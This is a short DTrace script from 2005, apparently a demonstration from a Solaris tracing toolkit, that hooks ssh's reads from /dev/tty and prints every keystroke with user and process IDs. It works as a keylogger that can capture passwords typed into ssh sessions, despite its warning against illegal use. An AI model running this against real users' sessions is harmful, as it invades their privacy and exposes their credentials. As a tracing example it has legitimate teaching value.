#!/usr/sbin/dtrace -s
/*
 * sshkeysnoop.d - A program to print keystroke details from ssh.
 *                 Written in DTrace (Solaris 10 build 63).
 *
 * WARNING: This is a demonstration program, please do not use this for
 * illegal purposes in your country such as breeching privacy. 
 *
 * 16-Jun-2005, ver 0.80.       (check for newer versions)
 *
 * USAGE:       ./sshkeysnoop.d
 *
 *
 * FIELDS:
 *              UID     user ID
 *              PID     process ID
 *              PPID    parent process ID
 *              TYPE    either key (keystroke) or cmd (command)
 *              TEXT    text contained in the read/write
 *
 * Standard Disclaimer: This is freeware, use at your own risk.
 *
 * 14-Jan-2005  Brendan Gregg   Created this. http://www.brendangregg.com/DTrace/sshkeysnoop.d
 */

#pragma D option quiet

/*
 * Print header
 */
dtrace:::BEGIN
{
        /* print header */
        printf("%5s %5s %5s %5s  %s\n","UID","PID","PPID","TYPE","TEXT");
}

/*
 * Print ssh execution
 */
syscall::execve:return
/execname == "ssh"/
{
    /* print output line */
        printf("%5d %5d %5d %5s  %s\n\n", curpsinfo->pr_euid, pid, 
        curpsinfo->pr_ppid, "cmd", stringof(curpsinfo->pr_psargs));
}

/*
 * Determine which fd is /dev/tty
 */
syscall::open:entry
/execname == "ssh" && copyinstr(arg0) == "/dev/tty"/
{
    /* track this syscall */
    self->ok = 1;
}

syscall::open:return
/self->ok/
{
    /* save fd number */
    self->fd = arg0;
}

/*
 * Print ssh keystrokes
 */
syscall::read:entry
/execname == "ssh" && arg0 == self->fd/
{
    /* remember buffer address */
        self->buf = arg1;
}

syscall::read:return
/self->buf != NULL && arg0 < 2/
{
        this->text = (char *)copyin(self->buf, arg0);

    /* print output line */
    printf("%5d %5d %5d %5s  %s\n", curpsinfo->pr_euid, pid, 
        curpsinfo->pr_ppid, "key", stringof(this->text));
    self->buf = NULL;
}
